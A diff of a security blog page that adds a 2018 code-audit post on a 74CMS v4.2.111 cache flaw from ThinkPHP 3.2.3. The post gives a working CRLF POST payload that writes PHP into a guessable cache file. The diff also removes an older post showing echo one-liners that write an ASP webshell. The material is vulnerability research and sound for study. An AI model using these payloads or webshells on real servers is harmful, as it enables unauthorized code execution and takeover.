@@ -236,6 +236,157 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/02/74CMS缓存设计缺陷导致getshell/" itemprop="url">代码审计 | 74CMS缓存设计缺陷导致getshell</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-02T10:15:41+08:00">
+                2018-10-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。</p>
+</blockquote>
+<hr>
+<p>审计cms：<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:用了<code>Thinkphp3.2.3</code>改写的缓存函数<code>set()</code>方法,而这个方法对写入的内容只进行了<code>serialize()</code>函数过滤操作,导致可用<code>%0D%0A</code>进行换行写入<code>php</code>代码而<code>getshell</code></p>
+<p>##<strong>1.基础知识:</strong><br><code>Thinkphp</code>的一些基本操作可参考文章:<br><a href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
+<p>##<strong>2.环境搭建:</strong><br>创建一个企业用户用于验证漏洞即可</p>
+<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
+<pre><code>url:http://127.0.0.1:84/index.php?m=&amp;c=Company&amp;a=com_auth
+POST:anew=1&amp;certificate_img_up=%2F%2F%0D%0Aphpinfo();//
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
+<p>##<strong>4.代码分析:</strong><br>相关变量已写入注释中：</p>
+<pre><code>#home\controller\companyController.class.php
+public function com_auth(){
+    ...
+    if(IS_POST &amp;&amp; $this-&gt;company_profile[&apos;audit&apos;]!=1){
+        $data[&apos;certificate_img&apos;] = I(&apos;post.certificate_img_up&apos;,&apos;&apos;,&apos;trim,badword&apos;);
+        $data[&apos;audit&apos;] = 2;
+    ...
+    if($this-&gt;company_profile[&apos;audit&apos;] == 0 || ($this-&gt;company_profile[&apos;audit&apos;] != 1 &amp;&amp; I(&apos;request.anew&apos;,0,&apos;intval&apos;) == 1)){
+        S(&apos;certificate_img_&apos; . $this-&gt;company_profile[&apos;uid&apos;],$this-&gt;company_profile[&apos;certificate_img&apos;]);
+    }
+    ...
+}
+</code></pre><p>这里在造成漏洞的原理是底层的tp框架的锅, 笔者前几天写过分析文章:<br><a href="https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/</a><br>我们这里再照常分析一遍代码流程:<br>跟进<code>TP</code>框架自带的<code>S()</code>缓存方法:<br><img src="http://static.zybuluo.com/chhyx/layesh9qbvqn0ouktr9ilpng/image_1coqjmno01prl1qtah9718cn4im9.png" alt="image_1coqjmno01prl1qtah9718cn4im9.png-100.5kB"></p>
+<p>跟进<code>set()</code>方法:</p>
+<pre><code>Librayr\Think\Cache\Driver\File.class.php 
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png" alt="image_1coqk0d8k19e511civine11hngm.png-95.1kB"></p>
+<p>跟进<code>filename()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/e6ppb2w8sof1u12rau4khhjs/image_1coqk5e7ro91oa92l11l991k4913.png" alt="image_1coqk5e7ro91oa92l11l991k4913.png-69.4kB"></p>
+<p><code>uid</code>为2得到的缓存文件名:<br><img src="http://static.zybuluo.com/chhyx/eghf8hflkq2jyclqf0n4w71o/image_1coqknv8vc5c6kf146l1hq11khj1g.png" alt="image_1coqknv8vc5c6kf146l1hq11khj1g.png-29.8kB"></p>
+<p>因为这里的<code>$filename</code>与<code>$name</code>相关联,而<code>$name</code>与<code>$uid</code>相关联<br>就是说我们可以根据用户的<code>uid</code>来得到缓存文件名 进而可<code>getshell</code><br><img src="http://static.zybuluo.com/chhyx/m1gq5ipikux0b1t8qkqi9y6w/image_1coql21hfvtdeae5l418hs9021t.png" alt="image_1coql21hfvtdeae5l418hs9021t.png-151.8kB"><br><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
+<p><code>uid</code>可在个人主页看到:<br><img src="http://static.zybuluo.com/chhyx/13fya1esr4q0z309key35hsj/image_1coqmpc8hsc515brgk313ra1ben2n.png" alt="image_1coqmpc8hsc515brgk313ra1ben2n.png-86.2kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2320,144 +2471,11 @@ $this-&gt;PDOStatement = $this-&gt;linkID-&gt;prepare($sql);
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/18/echo写马技巧/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/18/echo写马技巧/" itemprop="url">echo写马技巧</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-18T08:15:41+08:00">
-                2018-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>win下与Linux写马方式不同 记录一下</p>
-</blockquote>
-<hr>
-<p><strong>1.windows环境：</strong></p>
-<p>错误姿势:</p>
-<pre><code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; c:\test\test.asp
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/3c1ubw1t3pztnb0ti98k4ppi/image_1cnlvn0if65u1ej713rtjrc1jv19.png" alt="image_1cnlvn0if65u1ej713rtjrc1jv19.png-6.8kB"></p>
-<p>我们可以看到我们的代码加了引号 导致无法执行</p>
-<p>正确姿势:</p>
-<pre><code>echo ^&lt;%eval request(cmd)%^&gt; &gt; c:\test\cmd.asp
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/nd2sueikbr59v1ri2sdev74q/image_1cnlvt3ufjbonoe1gaj91u1eujm.png" alt="image_1cnlvt3ufjbonoe1gaj91u1eujm.png-9.8kB"></p>
-<p><strong>2.Linux环境：</strong><br>linux下正确写马:<code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; test.asp</code><br><img src="http://static.zybuluo.com/chhyx/fx68wthg11dls5bmxemtinjy/image_1cnm0h7smciu1gel1muegi4150u1j.png" alt="image_1cnm0h7smciu1gel1muegi4150u1j.png-61.1kB"></p>
-<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2017/08/26/echo/" target="_blank" rel="noopener">https://mochazz.github.io/2017/08/26/echo/</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2503,7 +2521,7 @@ $this-&gt;PDOStatement = $this-&gt;linkID-&gt;prepare($sql);
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
